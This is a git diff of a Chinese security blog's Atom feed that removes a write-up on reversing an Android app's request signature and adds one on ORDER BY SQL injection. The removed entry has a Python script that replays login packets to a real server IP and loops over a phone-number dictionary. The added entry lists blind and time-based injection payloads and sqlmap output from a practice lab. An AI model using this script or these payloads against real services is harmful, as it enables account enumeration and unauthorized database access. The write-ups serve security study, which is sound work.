@@ -172,179 +172,6 @@ private <span class="keyword">function</span> base_class(<span class="variable">
   </entry>
   
   <entry>
-    <title><![CDATA[一次破解apk通信签名进行漏洞挖掘的记录]]></title>
-    <link href="http://xdxd.love/2016/05/10/%E4%B8%80%E6%AC%A1%E7%A0%B4%E8%A7%A3apk%E9%80%9A%E4%BF%A1%E7%AD%BE%E5%90%8D%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
-    <id>http://xdxd.love/2016/05/10/一次破解apk通信签名进行漏洞挖掘的记录/</id>
-    <published>2016-05-10T07:58:23.000Z</published>
-    <updated>2016-05-12T06:18:46.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
-<h1 id="协议分析">协议分析</h1><p>使用wireshark抓包分析。发现使用了服务器的30001端口通信。<br><img src="/images/apkqianming1.png" alt=""><br><img src="/images/apkqianming2.png" alt=""><br><img src="/images/apkqianming3.png" alt=""><br>可以看到用户名，密码，以及时间戳。尝试截止重放这个包。发现提示时间不对，应该是验证了时间戳。</p>
-<h1 id="apk逆向分析">apk逆向分析</h1><p>反编译apk。搜索关键字，定位到如下代码：</p>
-<pre><code>String valueOf = String.valueOf(System.currentTimeMillis())<span class="comment">;</span>
-       newBuilder.f(valueOf)<span class="comment">;</span>
-       newBuilder.g(Token.getSignature(valueOf.getBytes(Charset.forName(HTTP.UTF_8))))<span class="comment">;</span>
-       return newBuilder<span class="comment">;</span>
-</code></pre><p>通过观察协议数据包，一直数据包中有时间戳，而这个getSignature是对System.currentTimeMillis()进行了签名，拼接到了请求中。猜测这个函数是最终的签名函数，跟进getSignature。</p>
-<pre><code><span class="keyword">package</span> com.fangdd.app.utils;
-
-<span class="keyword">import</span> com.fangdd.app.ui.widget.ao;
-<span class="keyword">import</span> java.security.Key;
-<span class="keyword">import</span> java.security.MessageDigest;
-<span class="keyword">import</span> javax.crypto.Mac;
-<span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;
-
-<span class="keyword">public</span> class Token {
-    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">String</span> getSignature(<span class="built_in">byte</span>[] bArr);
-
-    <span class="keyword">static</span> {
-        System.loadLibrary(<span class="string">"fddutils"</span>);
-    }
-
-    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] encodeHmacSha1(<span class="built_in">byte</span>[] bArr, <span class="built_in">byte</span>[] bArr2) {
-        <span class="built_in">char</span>[] cArr = <span class="keyword">new</span> <span class="built_in">char</span>[]{<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>};
-        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();
-        <span class="keyword">try</span> {
-            Key secretKeySpec = <span class="keyword">new</span> SecretKeySpec(bArr2, <span class="string">"HmacSHA1"</span>);
-            Mac instance = Mac.getInstance(<span class="string">"HmacSHA1"</span>);
-            instance.init(secretKeySpec);
-            <span class="keyword">for</span> (<span class="built_in">byte</span> b : instance.doFinal(bArr)) {
-                stringBuilder.<span class="built_in">append</span>(<span class="keyword">new</span> <span class="built_in">char</span>[]{cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>], cArr[b &amp; <span class="number">15</span>]});
-            }
-            <span class="keyword">return</span> stringBuilder.toString().getBytes(<span class="string">"UTF-8"</span>);
-        } <span class="keyword">catch</span> (Exception e) {
-            System.err.<span class="built_in">println</span>(<span class="string">"encodeHmacSha1 error,message = invalid key, key = {}"</span> + bArr2.toString());
-            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">0</span>];
-        }
-    }
-
-    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> encodeSha1(<span class="keyword">String</span> <span class="built_in">str</span>) {
-        <span class="built_in">int</span> i = <span class="number">0</span>;
-        <span class="keyword">try</span> {
-            MessageDigest instance = MessageDigest.getInstance(<span class="string">"SHA"</span>);
-            instance.update(<span class="built_in">str</span>.getBytes());
-            <span class="built_in">byte</span>[] digest = instance.digest();
-            StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();
-            <span class="keyword">for</span> (<span class="built_in">byte</span> b : digest) {
-                stringBuffer.<span class="built_in">append</span>(Integer.toString((b &amp; ao.b) + <span class="number">256</span>, <span class="number">16</span>).substring(<span class="number">1</span>));
-            }
-            StringBuffer stringBuffer2 = <span class="keyword">new</span> StringBuffer();
-            <span class="keyword">while</span> (i &lt; digest.length) {
-                <span class="keyword">String</span> toHexString = Integer.toHexString(digest[i] &amp; ao.b);
-                <span class="keyword">if</span> (toHexString.length() == <span class="number">1</span>) {
-                    stringBuffer2.<span class="built_in">append</span>(<span class="string">'0'</span>);
-                }
-                stringBuffer2.<span class="built_in">append</span>(toHexString);
-                i++;
-            }
-            <span class="keyword">return</span> stringBuffer2.toString();
-        } <span class="keyword">catch</span> (Exception e) {
-            e.printStackTrace(System.err);
-            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">String</span>();
-        }
-    }
-}
-</code></pre><p>发现调用的是so中的函数。</p>
-<h1 id="smali插桩定位关键函数">smali插桩定位关键函数</h1><p>采用<a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
-<pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
-<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
-<span class="keyword">.source</span> <span class="string">"crack.java"</span>
-
-<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
-<span class="keyword">    .locals</span> 1
-<span class="keyword">    .prologue</span>
-
-   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
-   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
-   <span class="instruction"> return-void
-</span><span class="keyword">.end method</span>
-</code></pre><p>打印getsignature的值和抓包对比。</p>
-<pre><code>invoke-static {<span class="variable">v1</span>}, <span class="class">Lcom/fangdd/app/utils/Token;</span><span class="function">-&gt;getSignature(</span><span class="keyword">[</span>B<span class="function">)</span><span class="class">Ljava/lang/String;</span><span class="instruction">
-move-result-object </span><span class="variable">v1</span>
-<span class="instruction">
-invoke-static </span>{<span class="variable">v1</span>}, <span class="class">Lcrack;</span><span class="function">-&gt;log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
-</code></pre><p>发现确实是getSignature作为签名函数。</p>
-<p><img src="/images/apkqianming4.png" alt=""></p>
-<h1 id="编写apk调用so">编写apk调用so</h1><p>使用androidstudio作为ide，在src/main目录下新建jniLibs/armeabi文件夹，将so文件放在该文件夹下面。具体详细的过程可以参考<a href="http://seniorzhai.github.io/2015/02/13/AndroidStudio%E8%B0%83%E7%94%A8so%E6%96%87%E4%BB%B6/" target="_blank" rel="external">AndroidStudio调用so文件</a>。按照以前apk的中包名，新建一模一样的包。详细的测试代码见附件。测试调用getSignature方法：</p>
-<pre><code>public <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">ActionBarActivity</span> {</span>
-
-    <span class="annotation">@Override</span>
-    <span class="keyword">protected</span> void onCreate(<span class="type">Bundle</span> savedInstanceState) {
-        <span class="keyword">super</span>.onCreate(savedInstanceState);
-        setContentView(<span class="type">R</span>.layout.activity_main);
-        <span class="type">String</span> <span class="class"><span class="keyword">object</span>;</span>
-        <span class="class"><span class="keyword">object</span> =</span> <span class="type">String</span>.valueOf(<span class="type">System</span>.currentTimeMillis());
-        <span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>)));
-        <span class="type">Log</span>.d(<span class="string">"111time"</span>,<span class="class"><span class="keyword">object</span>);</span>
-        <span class="type">Log</span>.d(<span class="string">"111"</span>,<span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>))));
-        <span class="type">System</span>.out.println(<span class="string">"test"</span>);
-    }
-</code></pre><p>查看logcat输出。</p>
-<p><img src="/images/apkqianming5.png" alt=""></p>
-<p>获得时间戳和时间戳的签名。采用以下脚本测试：</p>
-<pre><code><span class="comment">#!/usr/bin/env python</span>
-
-<span class="keyword">import</span> socket
-<span class="keyword">import</span> struct
-<span class="keyword">import</span> time
-
-
-
-<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
-    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)
-
-denglu1 = h2bin(<span class="string">''' c8 01 08 05 10 00 30 02  3a 05 34 2e 34 2e 34 42 
- 24 48 54 43 20 4f 6e 65  20 2d 20 34 2e 34 2e 34 
- 20 2d 20 41 50 49 20 31  39 20 2d 20 31 30 38 30 
- 78 31 39 32 30 48 17 52  03 36 2e 34 7a 3b 08 02 
- 12 37 0a 0b '''</span>)
-
-denglu2 = h2bin(<span class="string">''' 12 
- 06 31 32 33 34 35 36 5a  20 64 61 64 64 61 37 65 
- 66 32 30 34 37 33 36 38  33 61 38 34 65 61 34 31 
- 65 65 61 31 61 38 61 30  31 8a 01 03 66 64 64 a2 
- 01 0d '''</span>)
-
-denglu3 = h2bin(<span class="string">''' aa 
- 01 38 4d 54 45 33 5a 6d  46 68 4d 6d 49 78 4e 57 
- 45 7a 4e 57 59 31 4d 7a  63 78 4e 47 51 77 4d 44 
- 55 32 59 57 4e 6d 5a 44  6c 6b 5a 54 42 68 4f 44 
- 63 32 4e 57 49 34 4e 67  3d 3d                          
-'''</span>)
-
-denglu4 = h2bin(<span class="string">'''aa 
- 01 38 '''</span>)
-HOST=<span class="string">'103.235.228.10'</span>
-PORT=<span class="number">30001</span>
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((HOST,PORT))
-
-phonefile = open(<span class="string">'/Users/security/dict/13Wphone.txt'</span>)
-<span class="keyword">for</span> phone <span class="keyword">in</span> phonefile:
-    <span class="comment"># denglu = denglu1+struct.pack('11s',phone)+denglu2+struct.pack('13s',str(int(time.time()*1000)))+denglu3</span>
-    denglu = denglu1+struct.pack(<span class="string">'11s'</span>,phone) +denglu2+<span class="string">'1463032691831'</span>+denglu4 +<span class="string">'MTQzMmUyYTYwMjFmNGU2ODM5YWM2MDQwOTdkZWFkNDY3NzdkZGY2Yw=='</span>
-    <span class="keyword">print</span> <span class="string">'connected'</span>
-    s.sendall(denglu)
-    <span class="keyword">print</span> <span class="string">'sendall'</span>
-    data=s.recv(<span class="number">1024</span>)
-    <span class="keyword">print</span> data
-    <span class="comment"># print phone</span>
-<span class="comment"># print denglu</span>
-s.close()
-</code></pre><p>发现可以成功调用登录接口。</p>
-<h1 id="编写poc">编写poc</h1><h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/tips/2871" target="_blank" rel="external">http://drops.wooyun.org/tips/2871</a><br><a href="http://drops.wooyun.org/tips/2986" target="_blank" rel="external">http://drops.wooyun.org/tips/2986</a><br><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">http://www.52pojie.cn/thread-255754-1-1.html</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
-<h1 id="协议分析">协议分析</h1><p>使用wi]]>
-    </summary>
-    
-      <category term="签名逆向" scheme="http://xdxd.love/tags/%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/"/>
-    
-      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[imagemagic RCE漏洞分析与利用]]></title>
     <link href="http://xdxd.love/2016/05/05/imagemagic-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
     <id>http://xdxd.love/2016/05/05/imagemagic-RCE漏洞分析与利用/</id>
@@ -1047,6 +874,91 @@ echo <span class="string">"Array parameter is missing"</span>;
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[order by注入点利用方式分析]]></title>
+    <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
+    <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
+    <published>2016-03-07T02:00:56.000Z</published>
+    <updated>2016-03-08T07:58:08.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为：</p>
+<pre><code>error_reporting(<span class="number">0</span>);
+<span class="variable">$id</span>=$_GET[<span class="string">'sort'</span>];  
+<span class="keyword">if</span>(isset(<span class="variable">$id</span>))
+{
+    //logging the connection parameters to a file for analysis.
+    <span class="variable">$fp</span>=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);
+    fwrite(<span class="variable">$fp</span>,<span class="string">'SORT:'</span>.<span class="variable">$id</span>.<span class="string">"\n"</span>);
+    fclose(<span class="variable">$fp</span>);
+    <span class="variable">$sql</span>=<span class="string">"SELECT * FROM users ORDER BY $id"</span>;
+    /* execute multi query */
+    if (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))
+    {
+</code></pre><p>可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入。</p>
+<p><img src="/images/orderby1.png" alt=""></p>
+<p><img src="/images/orderby2.png" alt=""></p>
+<h1 id="利用方式：">利用方式：</h1><p>mysql 5中 select order by的语法如下：</p>
+<pre><code><span class="operator"><span class="keyword">SELECT</span> 
+[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ] 
+  [<span class="keyword">HIGH_PRIORITY</span>] 
+  [<span class="keyword">STRAIGHT_JOIN</span>] 
+  [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>] 
+  [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>] 
+select_expr [, select_expr ...] 
+[<span class="keyword">FROM</span> table_references 
+[<span class="keyword">WHERE</span> where_condition] 
+[<span class="keyword">GROUP</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
+  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]] 
+[<span class="keyword">HAVING</span> where_condition] 
+[<span class="keyword">ORDER</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
+  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...] 
+[<span class="keyword">LIMIT</span> {[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>}] 
+[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)] 
+[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options 
+  | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span> 
+  | <span class="keyword">INTO</span> var_name [, var_name]] 
+[<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span>
+</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于order by 后面不可以跟union。</p>
+<p>比如：</p>
+<pre><code>select id ,rand(<span class="number">0</span>) from requests order by rand() <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span>
+</code></pre><p>会报错，Incorrect usage of UNION and ORDER BY</p>
+<p>所以通常的利用都是使用了一些技巧。</p>
+<h1 id="盲注：">盲注：</h1><h2 id="需要知道字段名">需要知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
+<pre><code>(<span class="operator"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">id</span> <span class="keyword">else</span> price <span class="keyword">end</span>)
+
+<span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
+</code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
+<p>1,基于表达式结果盲注</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-07406" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07406</a></p>
+<p>不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</p>
+<h2 id="成熟的利用方式">成熟的利用方式</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
+<pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
+</code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
+<p>payload:</p>
+<pre><code>id,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,(select <span class="number">1</span> from information_schema.tables))
+</code></pre><p>当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-076151" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-076151</a></p>
+<p>基于 order by rand(true);order by rand(false);返回不同进行盲注<br>payload:rand(ascii(mid(database(),1,1))=109)</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-0152570" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0152570</a></p>
+<p>关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</p>
+<p>参考这里的讨论：<a href="http://zone.wooyun.org/content/25733" target="_blank" rel="external">http://zone.wooyun.org/content/25733</a></p>
+<h2 id="sqlmap利用方式">sqlmap利用方式</h2><p>使用level5 risk3</p>
+<pre><code>Parameter: sort (<span class="keyword">GET</span>)
+    Type: <span class="built_in">boolean</span>-based blind
+    Title: MySQL RLIKE <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span>, HAVING, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause
+    Payload: sort=<span class="number">1</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">9644</span>=<span class="number">9644</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))
+    Type: <span class="keyword">AND</span>/<span class="keyword">OR</span> time-based blind
+    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (<span class="keyword">SELECT</span>)
+    Payload: sort=<span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))MVan)
+---
+</code></pre><h1 id="思考">思考</h1>]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为]]>
+    </summary>
+    
+      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
